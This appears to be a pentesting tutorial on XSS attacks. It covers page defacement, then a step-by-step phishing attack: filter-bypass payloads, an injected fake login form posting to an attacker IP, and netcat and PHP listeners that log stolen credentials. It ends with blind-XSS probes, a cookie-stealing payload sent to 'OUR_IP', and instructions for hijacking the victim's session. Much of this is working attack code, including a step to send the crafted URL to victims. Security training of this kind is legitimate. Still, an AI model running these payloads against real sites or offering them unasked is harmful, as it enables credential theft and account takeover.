# XSS Attacks

### Defacing

After we successfully discover a XSS vulnerability, we might want exploit it and inject JavaScript code through XSS and make a web page look any way we like.

There are some common HTML elements usually utilized to change the original look of a web page:

* Background Color <mark style="color:purple;">document.body.style.background</mark>
* Background <mark style="color:purple;">document.body.background</mark>
* Page Title <mark style="color:purple;">document.title</mark>
* Page Text <mark style="color:purple;">DOM.innerHTML</mark>

#### Changing the Background

```html
<script>document.body.style.background = "black"</script>
```

{% code overflow="wrap" %}
```html
<script>document.body.background = "https://www.example.com/images/logo.svg"</script>
```
{% endcode %}

#### Changing Page Title

```html
<script>document.title = 'Example Site'</script>
```

#### Changing Page Text

It is possible to change the text of a specific HTML element/DOM using <mark style="color:purple;">innerHTML</mark> function:

```javascript
document.getElementById("todo").innerHTML = "New Text"
```

### Phishing

A common type of XSS attack is phishing. In these attacks, scammers use fake but convincing information to trick people into giving away their sensitive information. One way this happens is by creating fake login forms that capture users' login details and send them to the attacker. The attacker can then use this information to access the victim's account.

If we find an XSS vulnerability in a web application for a specific organization, we can use it to run a phishing simulation. This exercise helps us see how aware the organization's employees are about security, especially if they trust the vulnerable web application and don’t think it could be harmful.



#### XSS Discovery

### Step 1: Understanding the Target Application

1. **Identify the Input Field**: Locate the input field where user input is accepted (e.g., an image URL input).
2. **Analyze the Output**: Use browser developer tools (F12) to inspect how your input is rendered in the HTML.

### Step 2: Initial Payload Testing

1. **Basic XSS Payload**: Start with a simple payload:

```javascript
<script>alert('XSS');</script>
```

* Input this into the image URL field and submit.
* If the alert box appears, you have confirmed an XSS vulnerability.

2. **Check for Output Encoding**: If the payload does not execute, check for HTML entities (e.g., `&lt;` for `<`).

### Step 3: Crafting a Working Payload

1. **Bypass Filters**: If basic payloads are blocked, try variations:
   * Use event handlers:

```html
<img src="x" onerror="alert('XSS');">
```

* Use alternative tags or attributes:

```html
<svg><script>alert('XSS');</script></svg>
```

2. **Inspecting the HTML Output**: After submitting your payload, view the page source to see how your input is rendered.

### Step 4: Developing the Phishing Payload

1. **Create a Login Form**: Use `document.write()` to inject the phishing form:

{% code overflow="wrap" %}
```javascript
document.write('<h3>Please login to continue</h3><form action="http://YOUR_IP"><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>');
```
{% endcode %}

2. **Remove Existing Elements**: To make the phishing form more convincing, remove the original input field:

```javascript
document.getElementById('urlform').remove();
```

3. **Combine the Code**: Your final payload might look like this:

{% code overflow="wrap" %}
```javascript
document.getElementById('urlform').remove();
document.write('<h3>Please login to continue</h3><form action="http://YOUR_IP"><input type="text" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" value="Login"></form>');
```
{% endcode %}

### Step 5: Setting Up the Listener

1. **Using Netcat**: Start a listener to capture the credentials:

```bash
sudo nc -lvnp 80
```

2. **Using PHP**: Create a PHP script to log the credentials:

```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://YOUR_SERVER_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```

* Save this as `index.php` and run a PHP server:

```bash
sudo php -S 0.0.0.0:80
```

### Step 6: Executing the Attack

1. **Craft the Malicious URL**: Combine the target URL with your payload:

```
http://target-website.com/phishing?url=<your_payload_here>
```

2. **Send the URL**: Share the crafted URL with potential victims.
3. **Capture Credentials**: When a victim logs in, their credentials will be sent to your server, and you can check `creds.txt` for the captured information.

### **Blind XSS**

**Understanding Session Hijacking and XSS Attacks**

When you use websites, they often remember you by using something called cookies. These cookies are small pieces of data that help you stay logged in, so you don’t have to enter your password every time. But if a bad person gets hold of your cookie, they can pretend to be you and access your account without knowing your password. This is called **session hijacking**.

#### What is Blind XSS?

Sometimes, websites have a problem called **XSS (Cross-Site Scripting)**. This happens when someone can put harmful code (like JavaScript) into a website, and that code runs when someone else visits the site. A special kind of XSS is called **Blind XSS**. This means the bad code runs on a part of the website that the attacker can’t see, like an admin page.

#### How to Find Blind XSS:

To find out if a website has this problem, we can try to send a special code that asks for help from our own computer. For example, we can use a piece of code like this:

```html
<script src="http://OUR_IP/username"></script>
```

Here, `OUR_IP` is the address of our computer. If the website runs our code, it will send a message back to us, and we’ll know it’s vulnerable.

#### Using Remote Scripts:

We can also use a trick to load a script (a piece of code) from our computer onto the website. We can change the name of the script to match the field we are testing. For example, if we test a username field, we can name our script "username." If the website runs our script, we’ll see a request on our computer saying that the username field is vulnerable.

#### Testing for Vulnerabilities:

We can try different pieces of code in different fields on the website. Here are some examples of code we might use:

```html
<script src="http://OUR_IP"></script>
'><script src="http://OUR_IP"></script>
```

If we find one that works, we’ll know that field is vulnerable. We can skip fields like email and password because they usually have extra protections.

#### Stealing Cookies:

Once we find a vulnerable field, we can use another piece of code to grab the cookie from the victim’s browser and send it to our computer. For example, we can use this code:

```javascript
new Image().src='http://OUR_IP/index.php?c='+document.cookie;
```

This code creates a new image that points to our server and includes the cookie in the URL. This way, we can see what the cookie is and pretend to be the victim.

#### How to Use the Stolen Cookie:

After we get the cookie, we can use it to log into the victim’s account. We just need to add the cookie to our browser. In Firefox, we can open the Developer Tools, go to the Storage section, and add our cookie. The cookie has a name (like "session") and a value (like a long string of letters and numbers). Once we set our cookie, we can refresh the page, and we will have access to the victim's account.
